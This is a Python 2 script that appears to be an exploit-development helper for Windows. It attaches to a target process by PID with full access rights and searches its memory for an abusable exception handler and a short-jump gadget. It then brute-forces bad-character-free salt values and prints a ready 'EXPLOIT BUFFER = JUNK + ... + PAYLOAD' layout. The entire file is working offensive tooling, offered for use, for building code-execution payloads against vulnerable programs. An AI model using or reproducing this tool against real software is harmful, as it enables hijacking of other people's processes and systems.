import os
import sys
from optparse import OptionParser
from libgadget.gadget import *
from libdebug.debug import *
from libdebug.constants import *
from ctypes import *
import struct

def generate_good_dword(S):
    for a in S: 
        for b in S:
            for c in S:
                for d in S:
                    yield struct.unpack('L', chr(a) + chr(b) + chr(c) + chr(d))[0]
                    
def generate_alphanum_dword():
    S = list(xrange(0x30,0x3a)) + list(xrange(0x41,0x5b)) + list(xrange(0x61,0x7a))
    return generate_good_dword(S)
    
def generate_zerofree_dword():
    S = xrange(1,256)
    return generate_good_dword(S)
    
def generate_dword(char_range=xrange(256), exclude_chars=[]):
    return generate_good_dword([byte for byte in char_range if not byte in exclude_chars])
    
if __name__ == '__main__':
    usage = "python %s [OPTIONS] <target_PID> <gadget_mnemonic>"%sys.argv[0]
    parser = OptionParser(usage=usage,)
    options, args = parser.parse_args()
    
    # sanitize command-line
    if len(args) < 2:
        parser.error("Insufficient command-line arguments")
    target_PID = int(args[0])
    gadget_mnemonic = args[1]
    
    # grab target process handle
    hProc = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, 0, int(args[0]))
    assert hProc, "OpenProcess(..) screwed: GetLastError = 0x%08X"%windll.kernel32.GetLastError()
        
    # generate ROP-RE
    bad_chars = ["\x00","\n","\r","@"]
    
    def bad_addy(addy):
        for byte in struct.pack('<I', addy):
            if byte in bad_chars:
                return True
        return False
    
    if gadget_mnemonic == 'abuse-existing-xhandler' or 1:
        for abusable_xhandler, _ in FindSignatureInProcessMemory(hProc,
                                                                ABUSABLE_XHANDLER_SIGNATURE,
                                                                isBadAddress=bad_addy,
                                                                max_hits=1,
                                                                ):
            for shortjmp, _ in FindSignatureInProcessMemory(hProc,
                                                            generate_shortjmp(size=14,), # 14-byte short jmp
                                                            isBadAddress=bad_addy,
                                                           ):  
                for X in generate_dword(exclude_chars=[0x0,0xa,0xd],):
                    Y = (shortjmp - (4*3*X + 4))&0xFFFFFFFF
                    if not is_notzerofree(Y):
                        gadget_layout = ""
                        a = ("".join(['\\x%02X'%ord(byte) for byte in struct.pack('<I', shortjmp)]),
                             '<-- address of short jmp (lands on payload)')
                        b = ("".join(['\\x%02X'%ord(byte) for byte in struct.pack('<I', abusable_xhandler)]),
                             '<-- abusable xhandler')
                        c = ("".join(['\\x%02X'%ord(byte) for byte in struct.pack('<I', Y)]),
                             '<-- Y salt')
                        d = ("".join(['\\x%02X'%ord(byte) for byte in struct.pack('<I', X)]),
                             '<-- X salt (Y + 4*3*X equals address of the short jmp)')
                        for item in [a, b, c, d]:
                            gadget_layout += "\t%s\t%s\r\n"%item
                        gadget_layout += "\t%s\t\t<-- payload begins here\r\n"%(" "*12)
                        print 'GADGET (12 bytes, 4-byte aligned little-endian):\r\n\r\n%s'%gadget_layout
                        print '\r\nThis translates to:'
                        print '\r\n\tEXPLOIT BUFFER = JUNK + "%s" + "%s" + "%s" + "%s" + PAYLOAD'%(a[0],b[0],c[0],d[0])
                        sys.exit()
                        
    
    
    
